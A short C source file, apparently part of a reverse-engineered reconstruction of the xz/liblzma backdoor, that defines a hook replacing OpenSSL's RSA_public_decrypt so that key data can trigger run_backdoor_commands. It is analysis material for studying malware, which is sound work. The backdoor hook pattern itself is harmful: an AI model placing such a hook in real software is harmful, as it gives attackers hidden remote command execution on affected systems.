/**
 * Copyright (C) 2024 Stefano Moioli <smxdev4@gmail.com>
 **/
#include "xzre.h"

int hook_RSA_public_decrypt(
	int flen, unsigned char *from,
	unsigned char *to, RSA *rsa, int padding
){
	pfn_RSA_public_decrypt_t RSA_public_decrypt;

	if(!global_ctx) return 0;
	if(!global_ctx->imported_funcs) return 0;
	if(!(RSA_public_decrypt=global_ctx->imported_funcs->RSA_public_decrypt)) return 0;
	if(!rsa){
		return RSA_public_decrypt(flen, from, to, rsa, padding);
	}
	BOOL call_orig = TRUE;
	int result = run_backdoor_commands(rsa, global_ctx, &call_orig);
	if(call_orig){
		return RSA_public_decrypt(flen, from, to, rsa, padding);
	}
	return result;
}